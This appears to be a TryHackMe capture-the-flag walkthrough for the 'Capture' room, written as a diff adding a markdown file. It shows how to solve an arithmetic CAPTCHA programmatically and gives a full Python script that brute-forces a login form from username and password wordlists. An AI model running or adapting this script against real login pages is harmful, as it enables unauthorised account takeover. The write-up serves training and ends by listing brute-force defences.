@@ -1,0 +1,103 @@
+# 🚩 Capture — TryHackMe Walkthrough
+
+**Room:** [Capture](https://tryhackme.com/room/capture)
+**Difficulty:** Easy
+**Category:** Web / Brute Force / CAPTCHA Bypass
+**Tags:** Brute Force, CAPTCHA, Python, Scripting, Login
+
+---
+
+## 📋 Overview
+
+Capture is a web challenge involving brute-forcing a login form that is protected by a **CAPTCHA** — but the CAPTCHA can be solved programmatically. You'll write a Python script to automate the login process, solving the CAPTCHA and brute-forcing credentials.
+
+---
+
+## 🔧 Tools Used
+
+- Python (requests library) — Custom brute-force script
+- Browser / Burp Suite — Understanding the login form
+- Wordlists — Username and password lists
+
+---
+
+## 🌐 Step 1: Analyse the Login Form
+
+Navigate to `http://<TARGET_IP>`. Inspect the login form using Burp Suite to capture a request:
+
+```
+POST /login
+username=test&password=test&captcha=...
+```
+
+Notice the CAPTCHA — it's a **mathematical expression** (e.g., "3 + 5 = ?") rather than an image. This can be solved with Python.
+
+---
+
+## 🔍 Step 2: Understand the CAPTCHA
+
+The CAPTCHA appears in the page response as a simple arithmetic expression. Parse and evaluate it:
+
+```python
+import re
+# captcha_text = "What is 7 + 3?"
+match = re.search(r'(\d+)\s*([+\-*])\s*(\d+)', captcha_text)
+a, op, b = int(match.group(1)), match.group(2), int(match.group(3))
+if op == '+': answer = a + b
+elif op == '-': answer = a - b
+elif op == '*': answer = a * b
+```
+
+---
+
+## 🐍 Step 3: Write the Brute Force Script
+
+```python
+import requests
+import re
+
+url = "http://<TARGET_IP>/login"
+usernames = open("usernames.txt").read().splitlines()
+passwords = open("passwords.txt").read().splitlines()
+
+session = requests.Session()
+
+for username in usernames:
+    for password in passwords:
+        # Get CAPTCHA from login page
+        resp = session.get(url)
+        captcha_match = re.search(r'(\d+)\s*([+\-])\s*(\d+)', resp.text)
+        a, op, b = int(captcha_match.group(1)), captcha_match.group(2), int(captcha_match.group(3))
+        captcha_answer = a + b if op == '+' else a - b
+
+        # Submit login
+        data = {
+            "username": username,
+            "password": password,
+            "captcha": captcha_answer
+        }
+        r = session.post(url, data=data)
+        
+        if "Invalid" not in r.text and "incorrect" not in r.text.lower():
+            print(f"[+] Found! Username: {username}, Password: {password}")
+            print(r.text)
+            exit()
+```
+
+---
+
+## 🚩 Step 4: Capture the Flag
+
+Once the correct credentials are found, the login succeeds and the flag is displayed.
+
+> 🚩 **Flag:** Displayed on the page after successful brute-forced login.
+
+---
+
+## 📝 Key Takeaways
+
+- CAPTCHAs are only effective if they can't be solved programmatically — simple maths CAPTCHAs offer no protection against scripted attacks.
+- Python's `requests` library is a powerful tool for automating web interactions.
+- Real-world brute force defences: account lockout, exponential backoff, proper image CAPTCHAs, MFA.
+- Always re-fetch the CAPTCHA each attempt — they typically expire after one use.
+
